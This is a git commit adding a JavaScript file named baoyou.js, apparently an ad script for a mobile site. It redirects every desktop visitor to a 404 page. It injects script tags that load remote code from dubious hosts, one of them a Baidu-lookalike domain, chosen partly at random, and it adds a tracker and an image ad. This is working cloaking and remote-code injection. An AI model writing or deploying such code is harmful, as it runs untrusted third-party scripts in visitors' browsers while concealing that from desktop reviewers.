3fc38e810104197ceac92a4f947cfdea6327d8c1
ssacg <48800359+ssacg@users.noreply.github.com>
2019-05-30 01:27:16 +0800

    Add files via upload

---
+++ baoyou.js
@@ -0,0 +1,55 @@
+if(/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))){
+    if(window.location.href.indexOf("?mobile")<0){
+        try{
+            if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){
+
+            }else if(/iPad/i.test(navigator.userAgent)){
+
+            }else{
+                 
+            }
+        }catch(e){}
+    }
+
+}else{
+         window.location.href="/404.html"  
+            }
+function m_tu_xuanfu(){
+var random = {
+	ad_num : 2,
+	init : function(){
+		n = (Math.floor(Math.random()*random.ad_num+1));
+		switch(n){
+			case 1:
+				 document.writeln("<script src='https://m.jzvog.cn/20995.html?"+(new Date()).getTime()+"'><\/script>");    
+            break;
+			case 2:
+				 document.writeln("<script  src=\'https://m.liangshimingjue.com/541.html?\'></script>");   
+            break;
+		}
+	}
+}
+random.init();
+}
+function m_tupian_guding1(){
+document.writeln("<a href=\'http://ww3.sinaimg.cn/large/0060lm7Tgy1fczazbewbqj30dw0i2gme.jpg\'><img src=\'http://ww3.sinaimg.cn/large/0060lm7Tgy1fczays5hzlj312w09hnco.jpg\'/></a>");
+}
+function m_tupian_guding2(){
+document.writeln("<script src=https://baidu.dengzhoull.com//image/1389></script>");
+
+}
+function m_tupian_guding3(){
+document.writeln("<script src=https://baidu.dengzhoull.com//image/1389></script>");
+}
+function m_neirong_guding1(){
+
+}
+function m_qita(){
+
+}
+function m_tongji(){
+document.writeln("<script type=\'text/javascript\' src=\'https://js.users.51.la/19175998.js\'></script>");
+}
+/**
+ * Created by Shen.L on 2016/1/28.
+ */
